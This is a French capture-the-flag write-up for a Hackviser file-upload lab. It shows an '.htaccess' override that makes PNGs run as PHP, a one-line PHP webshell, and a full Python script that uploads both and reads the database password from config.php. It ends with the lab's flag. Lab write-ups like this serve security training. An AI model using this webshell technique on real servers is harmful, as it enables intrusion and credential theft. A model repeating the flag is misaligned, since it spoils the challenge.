# Writeup : File Extension Improved Filter Bypass (Hackviser)

## Informations Générales

- **Challenge** : File Extension Improved Filter Bypass
- **Plateforme** : Hackviser
- **Difficulté** : VIP (3 Points)
- **Objectif** : Trouver une extension de fichier non filtrée, uploader un fichier PHP malveillant, et lire le fichier `config.php` pour récupérer le mot de passe de la base de données.
- **URL Cible** : `https://polite-manta.europe1.hackviser.space`

---

## 1. Analyse et Reconnaissance

### Comportement du Filtre

L'application propose un formulaire pour uploader des images. Lorsqu'on essaie d'uploader un fichier `.php` (ou des variantes comme `.php3`, `.phtml`, etc.), on obtient une erreur :
> "Unauthorized file type found. Please upload gif, jpg, jpeg or png."

Ce message suggère une "liste blanche" (whitelist) stricte. Cependant, les tests montrent une contradiction :

- Les fichiers `.php` sont bloqués.
- Les fichiers `.jpg` sont acceptés.
- Les extensions exécutables exotiques (`.php5`, `.phar`) sont bloquées.

### La Faille

Malgré l'apparence d'une whitelist, le filtre est en réalité une **blacklist** mal configurée. Il bloque explicitement une liste d'extensions dangereuses connues, mais il **oublie de bloquer l'upload de fichiers de configuration Apache (`.htaccess`)**.

C'est critique car si nous pouvons uploader notre propre fichier `.htaccess` dans le dossier `/uploads/`, nous pouvons redéfinir les règles du serveur pour ce dossier.

---

## 2. Exploitation (Méthode Manuelle)

L'exploitation se fait en deux étapes :

1. **Reconfiguration du Serveur** : Uploader un fichier `.htaccess` qui ordonne au serveur d'exécuter les fichiers `.png` comme du code PHP.
2. **Exécution de Code (RCE)** : Uploader un fichier `.png` contenant du code PHP (webshell).

### Étape 1 : Upload de `.htaccess`

Contenu du fichier `.htaccess` à uploader :

```apache
AddType application/x-httpd-php .png
```

*Note : Si le filtre vérifie le `Content-Type`, il peut être nécessaire d'intercepter la requête (avec Burp Suite) et de changer le type MIME du fichier `.htaccess` en `image/jpeg` ou `text/plain`. Dans ce lab, `text/plain` passe sans problème.*

### Étape 2 : Upload du Payload PHP

Après l'upload réussi du `.htaccess`, tout fichier `.png` dans le répertoire `/uploads/` sera exécuté comme du PHP.

Nous créons un fichier `webshell.png` avec le contenu suivant :

```php
<?php system($_GET['cmd']); ?>
```

*Note : On utilise l'extension `.png` pour passer le filtre "image only", mais grâce à notre `.htaccess`, ce sera exécuté.*

### Étape 3 : Exécution de Commandes

On accède au webshell via l'URL :
`https://polite-manta.europe1.hackviser.space/uploads/webshell.png?cmd=ls -la ..`

Cela nous permet de lister les fichiers du dossier parent et de trouver `config.php`.

---

## 3. Script d'Exploitation Automatisé (Python)

Ce script réalise automatiquement les étapes ci-dessus pour extraire le mot de passe.

```python
import requests
import re

# Configuration
URL_BASE = "https://polite-manta.europe1.hackviser.space"
UPLOAD_URL = URL_BASE + "/index.php"
SHELL_FILENAME = "webshell.png"
SHELL_URL = URL_BASE + "/uploads/" + SHELL_FILENAME

def upload_file(filename, content, mime_type="text/plain"):
    """Fonction générique pour uploader un fichier."""
    files = {'input_image': (filename, content, mime_type)}
    data = {'submit': 'Upload'}
    try:
        r = requests.post(UPLOAD_URL, files=files, data=data)
        if "Unauthorized" in r.text:
            print(f"[-] Erreur : L'upload de {filename} a été bloqué.")
            return False
        return True
    except Exception as e:
        print(f"[-] Exception lors de l'upload : {e}")
        return False

def execute_cmd(cmd):
    """Exécute une commande via le webshell uploadé."""
    try:
        r = requests.get(SHELL_URL, params={'cmd': cmd})
        return r.text
    except Exception as e:
        return f"Erreur : {e}"

def main():
    print("[*] Démarrage de l'exploit...")

    # 1. Upload du .htaccess
    # On force Apache à traiter les fichiers .png comme du PHP
    print(f"[*] Tentative d'upload de .htaccess...")
    htaccess_content = "AddType application/x-httpd-php .png"
    if upload_file(".htaccess", htaccess_content, "text/plain"):
        print("[+] .htaccess uploadé avec succès.")
    else:
        print("[-] Impossible d'uploader .htaccess. Arrêt.")
        return

    # 2. Upload du Webshell (.png)
    print(f"[*] Tentative d'upload du webshell ({SHELL_FILENAME})...")
    shell_content = "<?php system($_GET['cmd']); ?>"
    # MIME type image/png pour être sûr de passer le filtre
    if upload_file(SHELL_FILENAME, shell_content, "image/png"):
        print("[+] Webshell uploadé avec succès.")
    else:
        print("[-] Impossible d'uploader le webshell. Arrêt.")
        return

    # 3. Extraction du mot de passe
    print("[*] Lecture de ../config.php...")
    config_content = execute_cmd("cat ../config.php")
    
    # Recherche du mot de passe avec une regex
    match = re.search(r"password\s*=\s*['\"](.*?)['\"]", config_content)
    
    if match:
        password = match.group(1)
        print(f"\n[SUCCESS] Mot de passe trouvé : {password}")
        print("-" * 30)
        print(f"Flag/Password : {password}")
        print("-" * 30)
    else:
        print("[-] Mot de passe non trouvé automatiquement. Voici le contenu du fichier :")
        print(config_content)

if __name__ == "__main__":
    main()
```

---

## 4. Résultat Final

En exécutant le script ou les commandes manuelles :

1. Le fichier `config.php` est lu depuis le répertoire parent (`../`).
2. Le contenu révèle les identifiants de la base de données.

**Mot de passe de la base de données (Flag) :**
`T9n3j6EnMRy2gPAC`
